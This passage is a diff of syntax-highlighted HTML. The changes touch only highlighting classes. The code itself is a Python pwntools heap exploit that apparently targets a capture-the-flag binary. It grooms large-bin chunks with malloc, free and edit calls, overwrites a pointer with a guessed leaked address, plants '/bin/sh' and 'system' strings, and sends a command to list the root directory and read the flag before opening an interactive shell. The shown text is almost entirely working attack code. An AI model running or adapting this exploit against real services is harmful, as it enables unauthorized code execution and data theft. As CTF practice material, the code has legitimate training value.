                 <span class="n">guess</span><span class="o">=</span><span class="p">(</span><span class="n">leak</span><span class="o">&lt;&lt;</span><span class="mi">12</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x328</span><span class="o">+</span><span class="mh">0x9000</span><span class="o">+</span><span class="mh">0x5d0000</span>
-                <span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">guess</span><span class="p">))</span>
+                <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">guess</span><span class="p">))</span>
 
 
-                <span class="nf">malloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x520</span><span class="p">)</span> <span class="c1"># vuln
-</span>                <span class="nf">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x47</span><span class="o">-</span><span class="mh">0x30</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="sh">"</span><span class="s">system</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
+                <span class="n">malloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x520</span><span class="p">)</span> <span class="c1"># vuln
+</span>                <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x47</span><span class="o">-</span><span class="mh">0x30</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">"system</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
 
-                <span class="nf">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mh">0x800</span><span class="p">)</span>
-                <span class="nf">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+                <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mh">0x800</span><span class="p">)</span>
+                <span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
 
-                <span class="nf">malloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x500</span><span class="p">)</span>
-                <span class="nf">malloc</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mh">0x500</span><span class="p">)</span>  <span class="c1"># this one overwrites smaller-0x10
+                <span class="n">malloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x500</span><span class="p">)</span>
+                <span class="n">malloc</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mh">0x500</span><span class="p">)</span>  <span class="c1"># this one overwrites smaller-0x10
 </span>
 
-                <span class="nf">free</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
-                <span class="nf">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
-                <span class="nf">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mh">0x520</span><span class="p">)</span> <span class="c1"># for consolidation
-</span>                <span class="nf">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x510</span><span class="p">)</span>  <span class="c1"># smaller
+                <span class="n">free</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+                <span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+                <span class="n">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mh">0x520</span><span class="p">)</span> <span class="c1"># for consolidation
+</span>                <span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x510</span><span class="p">)</span>  <span class="c1"># smaller
 </span>
-                <span class="nf">malloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x800</span><span class="p">)</span> <span class="c1">#for consolidation
-</span>                <span class="nf">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,(</span><span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">))</span><span class="o">*</span><span class="p">(</span><span class="mh">0x300</span><span class="o">//</span><span class="mi">16</span><span class="p">))</span>
+                <span class="n">malloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x800</span><span class="p">)</span> <span class="c1">#for consolidation
+</span>                <span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">))</span><span class="o">*</span><span class="p">(</span><span class="mh">0x300</span><span class="o">//</span><span class="mi">16</span><span class="p">))</span>
 
-                <span class="nf">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-                <span class="nf">malloc</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x800</span><span class="p">)</span> <span class="c1"># to push 0 to large bin
+                <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+                <span class="n">malloc</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x800</span><span class="p">)</span> <span class="c1"># to push 0 to large bin
 </span>
-                <span class="nf">link</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+                <span class="n">link</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
                 <span class="c1">#guess=b""
-</span>                <span class="nf">setout</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span><span class="p">,</span><span class="nf">p32</span><span class="p">(</span><span class="n">guess</span><span class="p">)[:</span><span class="mi">3</span><span class="p">])</span>
+</span>                <span class="n">setout</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="p">,</span><span class="n">p32</span><span class="p">(</span><span class="n">guess</span><span class="p">)[:</span><span class="mi">3</span><span class="p">])</span>
 
 
-                <span class="nf">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+                <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
                 <span class="c1">#debug()
-</span>                <span class="nf">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mh">0x800</span><span class="p">)</span> <span class="c1"># to push 1 to large bin
+</span>                <span class="n">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mh">0x800</span><span class="p">)</span> <span class="c1"># to push 1 to large bin
 </span>
-                <span class="nf">malloc</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mh">0x800</span><span class="p">)</span>  <span class="c1"># just to free 10 later
+                <span class="n">malloc</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mh">0x800</span><span class="p">)</span>  <span class="c1"># just to free 10 later
 </span>
 
-                <span class="nf">edit</span><span class="p">(</span><span class="mi">9</span><span class="p">,(</span><span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">))</span><span class="o">*</span><span class="p">(</span><span class="mh">0x800</span><span class="o">//</span><span class="mi">16</span><span class="p">),</span><span class="bp">True</span><span class="p">)</span>
-                <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
-                <span class="nf">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mh">0x500</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x701</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">,</span><span class="bp">True</span><span class="p">)</span>
+                <span class="n">edit</span><span class="p">(</span><span class="mi">9</span><span class="p">,(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">))</span><span class="o">*</span><span class="p">(</span><span class="mh">0x800</span><span class="o">//</span><span class="mi">16</span><span class="p">),</span><span class="bp">True</span><span class="p">)</span>
+                <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+                <span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x500</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x701</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">"a"</span><span class="p">,</span><span class="bp">True</span><span class="p">)</span>
                 <span class="c1">#pause()
-</span>                <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
-                <span class="nf">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
-                <span class="nf">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
-                <span class="nf">link</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span>
+</span>                <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+                <span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+                <span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+                <span class="n">link</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span>
 
-                <span class="nf">edit</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">"</span><span class="o">+</span><span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x47</span><span class="o">-</span><span class="mh">0x30</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="sh">"</span><span class="s">system</span><span class="se">\x00\x00</span><span class="sh">"</span><span class="p">,</span><span class="bp">True</span><span class="p">)</span>
-                <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+                <span class="n">edit</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="o">+</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x47</span><span class="o">-</span><span class="mh">0x30</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">"system</span><span class="se">\x00\x00</span><span class="s">"</span><span class="p">,</span><span class="bp">True</span><span class="p">)</span>
+                <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
                 <span class="c1">#pause()
 </span>
-                <span class="nf">edit</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="se">\x00\x00</span><span class="sh">"</span><span class="p">,</span><span class="bp">True</span><span class="p">)</span>
+                <span class="n">edit</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="s">"/bin/sh</span><span class="se">\x00\x00</span><span class="s">"</span><span class="p">,</span><span class="bp">True</span><span class="p">)</span>
 
-                <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">5</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
-                <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">10</span><span class="sh">"</span><span class="p">)</span>
-                <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">7</span><span class="sh">"</span><span class="p">)</span>
+                <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"5"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+                <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"10"</span><span class="p">)</span>
+                <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"7"</span><span class="p">)</span>
 
-                <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+                <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
                 <span class="c1">#p.interactive()
-</span>                <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">ls / ; cat /fla*</span><span class="sh">"</span><span class="p">)</span>
-                <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
-                <span class="n">msg</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
-                <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">------------------------------</span><span class="sh">"</span><span class="p">)</span>
-                <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
-                <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">------------------------------</span><span class="sh">"</span><span class="p">)</span>
-                <span class="k">if</span> <span class="sa">b</span><span class="sh">"</span><span class="s">app</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
-                        <span class="nf">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
-                        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span>                <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"ls / ; cat /fla*"</span><span class="p">)</span>
+                <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+                <span class="n">msg</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------"</span><span class="p">)</span>
+                <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------"</span><span class="p">)</span>
+                <span class="k">if</span> <span class="sa">b</span><span class="s">"app"</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
+                        <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+                        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-                <span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+                <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 
         <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
-                <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">bye</span><span class="sh">"</span><span class="p">)</span>
-                <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">"bye"</span><span class="p">)</span>
+                <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
         <span class="k">except</span> <span class="p">:</span>
                 <span class="k">pass</span>
         <span class="k">finally</span> <span class="p">:</span>
-                <span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+                <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
 
 </code></pre></div></div>
 
